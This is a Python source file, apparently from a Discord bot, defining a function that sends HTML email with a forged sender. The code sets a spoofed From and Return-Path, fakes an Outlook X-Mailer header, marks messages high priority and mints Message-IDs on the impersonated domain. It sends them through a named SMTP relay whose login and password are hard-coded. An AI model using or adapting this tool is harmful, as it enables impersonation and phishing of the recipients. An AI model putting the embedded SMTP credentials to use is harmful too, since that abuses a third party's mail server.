import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import discord
import sqlite3
import time
import uuid
import logging

async def send_email_spoofed(recipient_email, html_content, sender_email, subject, link=""):
    """Send an email with spoofed delivery method"""
    try:
        # Create message
        message = MIMEMultipart('alternative')
        message.attach(MIMEText(html_content, "html"))

        message['Subject'] = subject.strip()

        # Properly format sender email
        if '<' in sender_email and '>' in sender_email:
            message['From'] = sender_email
        else:
            parts = sender_email.split()
            if len(parts) > 1:
                sender_name = ' '.join(parts[:-1])
                sender_email_address = parts[-1].strip('<>')
                message['From'] = f"{sender_name} <{sender_email_address}>"
            else:
                message['From'] = sender_email

        message['To'] = recipient_email
        message['X-Priority'] = '1'
        message['X-Mailer'] = 'Microsoft Outlook'
        message['MIME-Version'] = '1.0'
        message['Date'] = time.strftime("%a, %d %b %Y %H:%M:%S +0000", time.gmtime())
        message['Return-Path'] = sender_email

        # Generate a unique Message-ID based on the domain in the sender email
        sender_domain = sender_email.split('@')[-1].split('>')[-1].strip()
        message['Message-ID'] = f"<{str(uuid.uuid4())}@{sender_domain}>"

        # Use custom SMTP settings as specified
        smtp_server = 'mail.inchiderecufolie.ro'
        smtp_port = 587
        smtp_username = 'server2556@inchiderecufolie.ro'
        smtp_password = 'AddSMTP@1337'

        print(f"Attempting to send spoofed email to: {recipient_email}")
        print(f"From: {sender_email}")
        print(f"Subject: {subject}")
        print(f"Using SMTP server: {smtp_server}:{smtp_port}")

        # Connect to SMTP server
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(smtp_username, smtp_password)

        # Send email
        server.sendmail(
            from_addr=sender_email if '<' in sender_email else sender_email.split()[-1].strip('<>'),
            to_addrs=[recipient_email],
            msg=message.as_string()
        )
        server.quit()

        print(f"✅ Spoofed email sent successfully to {recipient_email}")
        return "Email sent successfully"
    except Exception as e:
        print(f"❌ Error sending spoofed email: {str(e)}")
        return f"Failed to send email: {str(e)}"